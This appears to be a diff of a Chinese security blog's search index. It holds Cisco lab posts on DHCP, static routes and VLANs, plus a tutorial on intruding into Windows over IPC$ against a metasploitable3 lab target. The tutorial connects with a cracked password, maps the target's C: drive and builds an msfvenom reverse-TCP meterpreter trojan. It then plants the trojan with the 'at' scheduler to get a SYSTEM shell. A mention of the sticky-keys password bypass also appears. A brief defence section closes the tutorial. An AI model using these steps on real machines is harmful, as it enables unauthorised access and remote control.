-<blockquote>
-<p>如果出现问题请仔细看上图</p>
-</blockquote>
-<p>完成创建，木马默认生成在Kali的根目录下</p>
-<h4 id="开始上传木马"><a href="#开始上传木马" class="headerlink" title="开始上传木马"></a>开始上传木马</h4><pre><code>copy 本地路径 目标粘贴路径   向对方复制文件</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--5.png" alt></p>
-<p>这里已经成功把生成的木马文件复制到了目标机器上</p>
-<pre><code>at \\目标IP 时间(24h制) 路径   添加计划任务
-at \\目标IP   查看计划任务表</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--6.png" alt></p>
-<p>这里向目标机器添加了计划任务，意思就是2分钟后执行C:\system.exe</p>
-<p>at \目标ip  可以验证计划任务添加情况</p>
-<blockquote>
-<p>这里的时间最好不要设置太近，否则系统会认为是明天的这个时间</p>
-</blockquote>
-<p><strong>2</strong></p>
-<p><strong>分</strong></p>
-<p><strong>钟</strong></p>
-<p><strong>后</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--7.png" alt></p>
-<p>这里可以看到，原在Kali内持续监听的msf已经连接上对应的shell了</p>
-<p>输入shell进入   这里whoami已经看到  拿到了<strong>最高system权限</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--8.png" alt></p>
-<p><strong>当然！建立空连接后上传木马也好，后门开端口也好，方法大同小异</strong></p>
-<p><strong>这里拿到最高权限已经可以准备开后门，留隐藏端口了</strong></p>
-<p>这里补充一点msf中本木马的一些相关命令，可以用的到</p>
-<pre><code>1.基本命令
-help                       查看Meterpreter帮助
-background                 返回，把meterpreter后台挂起
-bgkill                     杀死一个背景 meterpreter 脚本
-bglist                     提供所有正在运行的后台脚本的列表
-bgrun                      作为一个后台线程运行脚本
-channel                    显示活动频道
-sessions -i number         与会话进行交互
-close                      关闭通道
-exit                       终止 meterpreter 会话
-interact id                切换进一个信道
-read                       从通道读取数据
-write                      将数据写入到一个通道
-2.文件系统命令
-upload 本地路径 目标路径      上传文件
-download 目标路径 本地路径    下载文件到本机
-edit 目标路径                编辑文件
-enumdesktops               用户登录数
-//文件系统命令详见Linux基础命令篇</code></pre><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ol>
-<li><strong>本地cmd中输入net share</strong></li>
-</ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--9.png" alt></p>
-<p>然后有几个删几个！</p>
-<pre><code>net share ipc$ /delete
-net share admin$ /delete
-net share c$ /delete</code></pre><ol start="2">
-<li><p><strong>关闭ipc$和默认共享所依赖的:server服务</strong></p>
-<p>控制面板 - 管理工具 - 服务 - server服务 - 属性 - 常规 - 启动类型 - 禁用</p>
-</li>
-<li><p><strong>屏蔽139，445端口</strong></p>
-<p>方法很多，建议百度</p>
-</li>
-<li><p><strong>设置复杂的密码，防止密码被暴力破解</strong></p>
-</li>
-</ol>
-<p>参考文献：</p>
-<p><a href="https://blog.csdn.net/u010984552/article/details/54890187" target="_blank" rel="noopener">https://blog.csdn.net/u010984552/article/details/54890187</a></p>
 ]]></content>
       <categories>
         <category>网络空间安全</category>
@@ -1253,6 +945,170 @@ apt-get clean            #清理无用的包</code></pre><hr>
       </tags>
   </entry>
   <entry>
+    <title>DHCP</title>
+    <url>/2020/06/25/dhcp/</url>
+    <content><![CDATA[<h1 id="网络搭建—DHCP"><a href="#网络搭建—DHCP" class="headerlink" title="网络搭建—DHCP"></a>网络搭建—DHCP</h1><blockquote>
+<p>实验平台: Cisco Packet Tracer 7.3.0</p>
+</blockquote>
+<h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/dhcp.png" alt></p>
+<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><h5 id="DHCP配置"><a href="#DHCP配置" class="headerlink" title="DHCP配置"></a>DHCP配置</h5><p>sw1</p>
+<pre><code>en
+config
+int f0/1
+no sw
+ip add 172.16.1.254 255.255.255.0
+int f0/23
+no sw
+ip add 10.1.1.1 255.255.255.0
+service dhcp
+ip dhcp exc 172.16.1.253 172.16.1.254
+ip dhcp exc 172.16.2.253 172.16.2.254
+ip dhcp pool net1
+network 172.16.1.0 255.255.255.0
+default-router 172.16.1.254
+dns-server 10.1.2.1
+exit
+ip dhcp pool net2
+network 172.16.2.0 255.255.255.0
+default-router 172.16.2.254
+dns-server 10.1.2.1
+exit
+ip route 172.16.2.0 255.255.255.0 10.1.1.2
+ip routing</code></pre><h5 id="DHCP中继"><a href="#DHCP中继" class="headerlink" title="DHCP中继"></a>DHCP中继</h5><p>sw2</p>
+<pre><code>en
+config
+int f0/23
+no sw
+ip add 10.1.1.2 255.255.255.0
+int f0/1
+no sw
+ip add 172.16.2.254 255.255.255.0
+exit
+service dhcp
+int f0/1
+ip helper 10.1.1.1
+exit
+ip routing
+ip route 172.16.1.0 255.255.255.0 10.1.1.1</code></pre><h5 id="DHCP监听"><a href="#DHCP监听" class="headerlink" title="DHCP监听"></a>DHCP监听</h5><p>sw3</p>
+<pre><code>en
+config
+ip dhcp snooping
+int f0/1
+ip dhcp snooping trust</code></pre><p>sw4</p>
+<pre><code>en
+config
+ip dhcp snooping
+int f0/1
+ip dhcp snooping trust</code></pre>]]></content>
+      <categories>
+        <category>网络搭建</category>
+      </categories>
+      <tags>
+        <tag>收录</tag>
+        <tag>网络搭建</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ipc$命令管道入侵示例</title>
+    <url>/2020/06/26/ipc$/</url>
+    <content><![CDATA[<h2 id="IPC-入侵示例"><a href="#IPC-入侵示例" class="headerlink" title="IPC$入侵示例"></a>IPC$入侵示例</h2><blockquote>
+<p>IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它是为了让<a href="https://baike.baidu.com/item/进程间通信" target="_blank" rel="noopener">进程间通信</a>而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 IPC$ 是 NT/2000 的一项新功能，它有一个特点，即在同一时间内，两个 IP 之间只允许建立一个连接。 NT/2000 在提供了  ipc$ 功能的同时，在初次<a href="https://baike.baidu.com/item/安装系统" target="_blank" rel="noopener">安装系统</a>时还打开了<a href="https://baike.baidu.com/item/默认共享" target="_blank" rel="noopener">默认共享</a>，即所有的逻辑共享 (c$,d$,e$ …… ) 和系统目录 winnt 或 windows(admin$) 共享。所有的这些，微软的初衷都是为了方便管理员的管理，但在有意无意中，导致了系统安全性的降低。</p>
+</blockquote>
+<p>入侵条件：<strong>拥有对方机器的用户名和密码</strong></p>
+<p>关于破解用户名密码等请参考文章，<strong>这里不再赘述</strong>！</p>
+<p>但是因为ipc$的dos命令登录特殊性，<strong>你甚至可以编写批处理进行暴力破解！</strong></p>
+<p>渗透机：Kali Linux 2019.3版本   WindowsXP</p>
+<p>靶机：metasploitable3-win2k8</p>
+<pre><code>net use \\目标ip\ipc$ 用户密码 /user:用户名   建立空连接
+net use z: \\目标ip\c$ 用户密码 /user:用户名  将对方的C盘映射到自己的Z盘中
+net use \\目标IP\ipc$ /del                  删除一个ipc$连接
+net use z: /del                            删除映射的z盘
+//这些都是DOS命令</code></pre><p>这里在破解到该用户的登录密码后，开始尝试建立空连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--1.png" alt></p>
+<p>成功建立了空连接</p>
+<p>这里尝试对对方的磁盘进行映射</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--2.png" alt></p>
+<p>这里看到，对方的C盘已经映射到左下角的Z盘里了</p>
+<p>这里可以轻易访问\读写对方的磁盘</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--3.png" alt></p>
+<h4 id="已经建立了空连接，开始上传木马"><a href="#已经建立了空连接，开始上传木马" class="headerlink" title="已经建立了空连接，开始上传木马"></a><strong>已经建立了空连接，开始上传木马</strong></h4><p>这里利用Kali Linux中Metasploitble生成一个木马文件</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -i 5 -b &apos;0x00&apos; LHOST=渗透机IP    LPORT=渗透机监听端口 -f exe &gt; 木马名.exe   生成木马
+use exploit/multi/handler   定义监听攻击模块
+set payloads windows/meterpreter/reverset_tcp   设置payload
+set lhost IP    设置渗透机ip
+set lport 端口    设置渗透机监听端口
+exploit   开始监听</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--4.png" alt></p>
+<blockquote>
+<p>如果出现问题请仔细看上图</p>
+</blockquote>
+<p>完成创建，木马默认生成在Kali的根目录下</p>
+<h4 id="开始上传木马"><a href="#开始上传木马" class="headerlink" title="开始上传木马"></a>开始上传木马</h4><pre><code>copy 本地路径 目标粘贴路径   向对方复制文件</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--5.png" alt></p>
+<p>这里已经成功把生成的木马文件复制到了目标机器上</p>
+<pre><code>at \\目标IP 时间(24h制) 路径   添加计划任务
+at \\目标IP   查看计划任务表</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--6.png" alt></p>
+<p>这里向目标机器添加了计划任务，意思就是2分钟后执行C:\system.exe</p>
+<p>at \目标ip  可以验证计划任务添加情况</p>
+<blockquote>
+<p>这里的时间最好不要设置太近，否则系统会认为是明天的这个时间</p>
+</blockquote>
+<p><strong>2</strong></p>
+<p><strong>分</strong></p>
+<p><strong>钟</strong></p>
+<p><strong>后</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--7.png" alt></p>
+<p>这里可以看到，原在Kali内持续监听的msf已经连接上对应的shell了</p>
+<p>输入shell进入   这里whoami已经看到  拿到了<strong>最高system权限</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--8.png" alt></p>
+<p><strong>当然！建立空连接后上传木马也好，后门开端口也好，方法大同小异</strong></p>
+<p><strong>这里拿到最高权限已经可以准备开后门，留隐藏端口了</strong></p>
+<p>这里补充一点msf中本木马的一些相关命令，可以用的到</p>
+<pre><code>1.基本命令
+help                       查看Meterpreter帮助
+background                 返回，把meterpreter后台挂起
+bgkill                     杀死一个背景 meterpreter 脚本
+bglist                     提供所有正在运行的后台脚本的列表
+bgrun                      作为一个后台线程运行脚本
+channel                    显示活动频道
+sessions -i number         与会话进行交互
+close                      关闭通道
+exit                       终止 meterpreter 会话
+interact id                切换进一个信道
+read                       从通道读取数据
+write                      将数据写入到一个通道
+2.文件系统命令
+upload 本地路径 目标路径      上传文件
+download 目标路径 本地路径    下载文件到本机
+edit 目标路径                编辑文件
+enumdesktops               用户登录数
+//文件系统命令详见Linux基础命令篇</code></pre><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ol>
+<li><strong>本地cmd中输入net share</strong></li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--9.png" alt></p>
+<p>然后有几个删几个！</p>
+<pre><code>net share ipc$ /delete
+net share admin$ /delete
+net share c$ /delete</code></pre><ol start="2">
+<li><p><strong>关闭ipc$和默认共享所依赖的:server服务</strong></p>
+<p>控制面板 - 管理工具 - 服务 - server服务 - 属性 - 常规 - 启动类型 - 禁用</p>
+</li>
+<li><p><strong>屏蔽139，445端口</strong></p>
+<p>方法很多，建议百度</p>
+</li>
+<li><p><strong>设置复杂的密码，防止密码被暴力破解</strong></p>
+</li>
+</ol>
+<p>参考文献：</p>
+<p><a href="https://blog.csdn.net/u010984552/article/details/54890187" target="_blank" rel="noopener">https://blog.csdn.net/u010984552/article/details/54890187</a></p>
+]]></content>
+      <categories>
+        <category>网络空间安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>5次shift漏洞破解系统密码</title>
     <url>/2020/06/28/shift/</url>
     <content><![CDATA[<h1 id="利用5次shift漏洞破解系统密码"><a href="#利用5次shift漏洞破解系统密码" class="headerlink" title="利用5次shift漏洞破解系统密码"></a>利用5次shift漏洞破解系统密码</h1><h2 id="Windows-五次shift键破解密码"><a href="#Windows-五次shift键破解密码" class="headerlink" title="Windows   五次shift键破解密码"></a>Windows   五次shift键破解密码</h2><p>原理：系统登录界面时五次按下shift键会弹出 - 粘滞键菜单   找到对应路径<strong>掉包成CMD即可</strong></p>
@@ -1311,6 +1167,150 @@ apt-get clean            #清理无用的包</code></pre><hr>
       <tags>
         <tag>网络空间安全</tag>
         <tag>收录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>静态路由</title>
+    <url>/2020/06/26/route/</url>
+    <content><![CDATA[<h1 id="网络搭建—静态路由"><a href="#网络搭建—静态路由" class="headerlink" title="网络搭建—静态路由"></a>网络搭建—静态路由</h1><blockquote>
+<p>实验平台: Cisco Packet Tracer 7.3.0</p>
+</blockquote>
+<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r1-1.png" alt></p>
+<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R0</p>
+<pre><code>en
+config
+int f0/0
+no shutdown
+ip add 192.168.1.1 255.255.255.0
+int s0/0/0
+no shutdown
+ip add 192.168.3.1 255.255.255.0
+exit
+ip routing
+ip route 192.168.4.0 255.255.255.0 192.168.3.2
+ip route 192.168.2.0 255.255.255.0 192.168.3.2</code></pre><p>R1</p>
+<pre><code>en
+config
+int s0/0/0
+no shutdown
+ip add 192.168.3.2 255.255.255.0
+int s0/0/1
+no shutdown
+ip add 192.168.4.2 255.255.255.0
+exit
+ip routing
+ip route 192.168.1.0 255.255.255.0 192.168.3.1
+ip route 192.168.2.0 255.255.255.0 192.168.4.1</code></pre><p>R2</p>
+<pre><code>en
+config
+int s0/0/0
+no shutdown
+ip add 192.168.4.1 255.255.255.0
+int f0/0
+no shutdown
+ip add 192.168.2.1 255.255.255.0
+exit
+ip routing
+ip route 192.168.1.0 255.255.255.0 192.168.4.2
+ip route 192.168.3.0 255.255.255.0 192.168.4.2</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r1-2.png" alt></p>
+]]></content>
+      <categories>
+        <category>网络搭建</category>
+      </categories>
+      <tags>
+        <tag>收录</tag>
+        <tag>网络搭建</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vlan划分</title>
+    <url>/2020/06/25/vlan/</url>
+    <content><![CDATA[<h1 id="网络搭建—VLAN"><a href="#网络搭建—VLAN" class="headerlink" title="网络搭建—VLAN"></a>网络搭建—VLAN</h1><blockquote>
+<p>实验平台: Cisco Packet Tracer 7.3.0</p>
+</blockquote>
+<h2 id="1-VlAN划分"><a href="#1-VlAN划分" class="headerlink" title="1.VlAN划分"></a>1.VlAN划分</h2><h3 id="1-单交换机"><a href="#1-单交换机" class="headerlink" title="(1)单交换机"></a>(1)单交换机</h3><h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/i-1.png" alt></p>
+<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><pre><code>en
+config
+int f0/1
+sw acc vlan 10
+int f0/2
+sw acc vlan 20
+int f0/3
+sw acc vlan 30
+end</code></pre><h3 id="2-双交换机"><a href="#2-双交换机" class="headerlink" title="(2)双交换机"></a>(2)双交换机</h3><h4 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/i2.png" alt></p>
+<h4 id="指令-1"><a href="#指令-1" class="headerlink" title="指令"></a>指令</h4><p>SW 1</p>
+<pre><code>en
+config
+int f0/1
+sw acc vlan 10
+int f0/2
+sw acc vlan 20
+int f0/24
+sw mode trunk
+sw trunk all vlan all
+end</code></pre><p>SW 2</p>
+<pre><code>en
+config
+int f0/1
+sw acc vlan 10
+int f0/2
+sw acc vlan 20
+int f0/24
+sw mode trunk
+sw trunk all vlan all
+end</code></pre><h2 id="2-Vlan间通信"><a href="#2-Vlan间通信" class="headerlink" title="2.Vlan间通信"></a>2.Vlan间通信</h2><h3 id="1-SVI"><a href="#1-SVI" class="headerlink" title="(1)SVI"></a>(1)SVI</h3><h4 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/ttt.PNG" alt></p>
+<h4 id="指令-2"><a href="#指令-2" class="headerlink" title="指令"></a>指令</h4><pre><code>en
+config
+int vlan 10
+ip add 192.168.1.254 255.255.255.0
+int vlan 20
+ip add 192.168.2.254 255.255.255.0
+exit
+int f0/1
+sw trunk encapsulation dot1q
+sw mode trunk
+ip routing
+end</code></pre><p>二层</p>
+<pre><code>en
+config
+int f0/1
+sw mode trunk
+sw trunk all vlan all
+int f0/2
+sw acc vlan 10
+int f0/4
+sw acc vlan 20</code></pre><h3 id="2-单臂路由"><a href="#2-单臂路由" class="headerlink" title="(2)单臂路由"></a>(2)单臂路由</h3><h4 id="拓扑-2"><a href="#拓扑-2" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/ccc.PNG" alt></p>
+<h4 id="指令-3"><a href="#指令-3" class="headerlink" title="指令"></a>指令</h4><p>路由</p>
+<pre><code>en 
+config
+int f0/0.1 
+en dot1q 10
+ip add 192.168.1.254 255.255.255.0
+no shutdown 
+int f0/0.2
+en dot1q 20
+ip add 192.168.2.254 255.255.255.0
+no shutdown
+exit 
+int f0/0
+ip routing
+no shutdown
+end</code></pre><p>二层</p>
+<pre><code>en
+config
+int f0/1
+sw mode trunk
+sw trunk all vlan all
+int f0/2
+sw acc vlan 10
+int f0/3
+sw acc vlan 20</code></pre>]]></content>
+      <categories>
+        <category>网络搭建</category>
+      </categories>
+      <tags>
+        <tag>收录</tag>
+        <tag>网络搭建</tag>
       </tags>
   </entry>
 </search>
